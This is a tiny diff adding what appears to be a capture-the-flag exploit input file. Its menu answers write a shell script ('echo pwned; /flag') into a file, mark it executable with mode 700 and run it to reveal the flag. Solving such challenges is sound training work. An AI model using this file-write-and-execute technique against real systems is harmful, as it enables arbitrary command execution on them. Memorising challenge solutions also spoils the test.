@@ -1,0 +1,14 @@
+1
+pwn
+2
+#! /bin/sh
+echo pwned; /flag
+3
+pwn
+700
+6
+1
+6
+1
+7
+pwn.txt
